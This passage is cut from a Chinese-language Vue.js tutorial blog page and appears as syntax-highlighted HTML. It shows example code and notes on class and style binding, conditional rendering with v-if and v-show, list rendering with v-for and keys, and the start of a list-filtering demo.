class="string">&quot;classArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--绑定class样式--对象写法，适用于：要绑定的样式个数确定，名字也确定，但要动态决定用不用--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;classObj&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--绑定style样式--对象写法--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;styleObj1&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--绑定style样式--数组写法--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;[styleObj1,styleObj2]&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;styleArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">mood:<span class="string">&#x27;normal&#x27;</span>,</span></span><br><span class="line"><span class="javascript">classArr:[<span class="string">&#x27;atguigu1&#x27;</span>,<span class="string">&#x27;atguigu2&#x27;</span>,<span class="string">&#x27;atguigu3&#x27;</span>],</span></span><br><span class="line">classObj:&#123;</span><br><span class="line"><span class="javascript">atguigu1:<span class="literal">false</span>,</span></span><br><span class="line"><span class="javascript">atguigu2:<span class="literal">false</span>,</span></span><br><span class="line">&#125;,</span><br><span class="line">styleObj1:&#123;</span><br><span class="line"><span class="javascript">fontSize:<span class="string">&#x27;40px&#x27;</span>,</span></span><br><span class="line"><span class="javascript">color:<span class="string">&#x27;red&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line">styleObj2:&#123;</span><br><span class="line"><span class="javascript">backgroundColor:<span class="string">&#x27;orange&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line">styleArr:[</span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript">fontSize:<span class="string">&#x27;40px&#x27;</span>,</span></span><br><span class="line"><span class="javascript">color:<span class="string">&#x27;green&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript">backgroundColor:<span class="string">&#x27;orange&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//changeMood()&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//this.mood = &#x27;happy&#x27;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">changeMood</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> arr = [<span class="string">&#x27;happy&#x27;</span>,<span class="string">&#x27;sad&#x27;</span>,<span class="string">&#x27;normal&#x27;</span>]</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> index = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">3</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.mood = arr[index]</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="19-条件渲染"><a href="#19-条件渲染" class="headerlink" title="19.条件渲染"></a>19.条件渲染</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>条件渲染<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">条件渲染：</span></span><br><span class="line"><span class="comment">1.v-if</span></span><br><span class="line"><span class="comment">写法：</span></span><br><span class="line"><span class="comment">（1）v-if=&quot;表达式&quot;；</span></span><br><span class="line"><span class="comment">（1）v-else-if=&quot;表达式&quot;；</span></span><br><span class="line"><span class="comment">（1）v-else=&quot;表达式&quot;；</span></span><br><span class="line"><span class="comment">适用于：切换频率较低的场景；</span></span><br><span class="line"><span class="comment">特点：不展示DOM元素直接被移除；</span></span><br><span class="line"><span class="comment">注意：v-if可以和v-else-if、v-else一起使用，但要求结构不能被“打断”。</span></span><br><span class="line"><span class="comment">2.v-show</span></span><br><span class="line"><span class="comment">写法：v-show=&quot;表达式&quot;；</span></span><br><span class="line"><span class="comment">适用于：切换频率较高的场景；</span></span><br><span class="line"><span class="comment">特点：不展示DOM元素未被移除，仅仅是使用样式隐藏掉；</span></span><br><span class="line"><span class="comment">注意：v-if可以和v-else-if、v-else一起使用，但要求结构不能被“打断”。</span></span><br><span class="line"><span class="comment">3.备注：</span></span><br><span class="line"><span class="comment">使用v-if时，元素可能无法被获取到，而使用v-show一定能获取到元素。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--使用v-show指令做条件渲染--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-show=&quot;false&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-show=&quot;1 === 1&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--使用v-if指令做条件渲染--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-if=&quot;false&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-if=&quot;1 === 1&quot;&gt;欢迎来到&#123;&#123;name&#125;&#125;&lt;/h2&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-show=&quot;n === 1&quot;&gt;java&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h2 v-show=&quot;n === 2&quot;&gt;spring&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h2 v-show=&quot;n === 3&quot;&gt;springBoot&lt;/h2&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-if=&quot;n === 1&quot;&gt;java&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h2 v-if=&quot;n === 1&quot;&gt;spring&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h2 v-if=&quot;n === 3&quot;&gt;springBoot&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;hr /&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--使用v-else-if和v-else指令做条件渲染--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;h2 v-if=&quot;n === 1&quot;&gt;java&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h2 v-else-if=&quot;n === 1&quot;&gt;spring&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h2 v-else-if=&quot;n === 3&quot;&gt;springBoot&lt;/h2&gt;</span></span><br><span class="line"><span class="comment">&lt;h2 v-else&gt;默认值&lt;/h2&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--v-if与template的配合使用--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">&quot;n === 1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>java<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>spring<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>springBoot<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line">n:0,</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="20-列表渲染-基本列表"><a href="#20-列表渲染-基本列表" class="headerlink" title="20.列表渲染-基本列表"></a>20.列表渲染-基本列表</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>列表渲染-基本列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">v-for指令：</span></span><br><span class="line"><span class="comment">1.用于展示列表数据；</span></span><br><span class="line"><span class="comment">2.语法 v-for=&quot;(item,index) in xxx&quot; :key=&quot;yyy&quot;。（in可以改为for）</span></span><br><span class="line"><span class="comment">3.可遍历数组、对象、字符串（很少用）、指定次数（很少用）。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历数组类型数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;li v-for=&quot;p in persons&quot; :key=&quot;p.id&quot;&gt;</span></span><br><span class="line"><span class="comment">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span></span><br><span class="line"><span class="comment">&lt;/li&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&#123;&#123;p&#125;&#125;---&#123;&#123;index&#125;&#125;--&gt;</span></span><br><span class="line">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历对象类型数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>汽车信息<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(value,key) in car&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;key&#125;&#125;-&#123;&#123;value&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历字符串类型数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>遍历字符串<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(a,b) in str&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;b&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;a&#125;&#125;-&#123;&#123;b&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历指定次数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>遍历字符串<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(a,b) in 5&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;a&#125;&#125;-&#123;&#123;b&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line">persons:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;王五&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;李四&#x27;</span>,<span class="attr">age</span>:<span class="number">48</span>&#125;,</span></span><br><span class="line">],</span><br><span class="line">car:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;奥迪A8&#x27;</span>,</span></span><br><span class="line"><span class="javascript">price:<span class="string">&#x27;70万&#x27;</span>,</span></span><br><span class="line"><span class="javascript">color:<span class="string">&#x27;灰色&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript">str:<span class="string">&#x27;hello&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="21-列表渲染-key的原理"><a href="#21-列表渲染-key的原理" class="headerlink" title="21.列表渲染-key的原理"></a>21.列表渲染-key的原理</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>列表渲染-key的原理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">面试题：react、vue中的key有什么作用？（key内部原理）</span></span><br><span class="line"><span class="comment">1.虚拟DOM中key的作用：</span></span><br><span class="line"><span class="comment">key是虚拟对象的标识，当状态中的数据发生变化时，Vue会根据“新数据”生成“新的虚拟DOM”，</span></span><br><span class="line"><span class="comment">跟随Vue进行“新虚拟DOM”与“旧虚拟DOM”的差异比较，比较规则如下：</span></span><br><span class="line"><span class="comment">2.对比规则：</span></span><br><span class="line"><span class="comment">(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：</span></span><br><span class="line"><span class="comment">①.若虚拟DOM中内容没变，直接使用之前的真实DOM；</span></span><br><span class="line"><span class="comment">②.若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM；</span></span><br><span class="line"><span class="comment">(2).旧虚拟DOM中未找到了与新虚拟DOM相同的key：</span></span><br><span class="line"><span class="comment">创建新的真实DOM，随后渲染到页面。</span></span><br><span class="line"><span class="comment">3.用index作为key可能会引发的问题：</span></span><br><span class="line"><span class="comment">(1).若对数据进行：逆序添加、逆序删除等破坏顺序操作，会产生没有必要的真实DOM更新==&gt;界面效果没问题，但效率低；</span></span><br><span class="line"><span class="comment">(2).如果结构中还包含输入类的DOM，会产生错误DOM更新==&gt;界面问题；</span></span><br><span class="line"><span class="comment">4.开发中如何选择key：</span></span><br><span class="line"><span class="comment">(1).最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值；</span></span><br><span class="line"><span class="comment">(2).如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没问题的；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历数组类型数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;add&quot;</span>&gt;</span>添加一个人<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;p.id&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line">persons:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;王五&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;李四&#x27;</span>,<span class="attr">age</span>:<span class="number">48</span>&#125;,</span></span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">add</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> p = &#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;老刘&#x27;</span>,<span class="attr">age</span>:<span class="number">68</span>&#125;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.persons.unshift(p)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="22-列表过滤"><a href="#22-列表过滤" class="headerlink" title="22.列表过滤"></a>22.列表过滤</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>列表过滤<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历数组类型数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入搜索名字&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;keyWord&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in filterPersons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//使用watch监视实现</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//#region</span></span></span><br><span class="line">/*new Vue(&#123;</span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">keyWord:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line">persons:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span 